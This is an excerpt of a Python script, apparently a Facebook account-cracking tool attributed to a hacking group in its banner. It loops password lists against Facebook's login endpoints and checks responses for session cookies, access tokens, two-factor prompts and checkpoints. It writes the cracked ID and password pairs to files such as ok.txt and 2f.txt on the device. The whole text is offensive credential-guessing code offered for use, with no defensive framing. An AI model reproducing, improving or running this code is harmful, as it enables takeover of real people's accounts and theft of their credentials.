...
\033[1;97m ------------------------------
\033[1;97m [+] Author : RAYEES.HAZRAT
\033[1;98m [+] Fb id  : HAZRAT.MAFIA
\033[1;97m [+] group  : SHEERZAD.&.HAZRAT.HACKING(RHS)
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[HaZraToO-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[HaZraToO-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                print('\033[1;32m[HaZraToO-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m[HaZraToO-2F] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m[HaZraToO-CP] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
...
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            ...
            if 'c_user' in cookies:
                    print('\033[1;32m[HaZraToO-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/HaZraToO_ID/ok.txt', 'a').write(ids+' | '+pas+'\n').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[HaZraToO-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/HaZraToO_ID/random2f.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            print('\033[1;31m[HaZraToO-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/HaZraToO_ID/randomcp.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
        loop+=1
    except Exception as e:
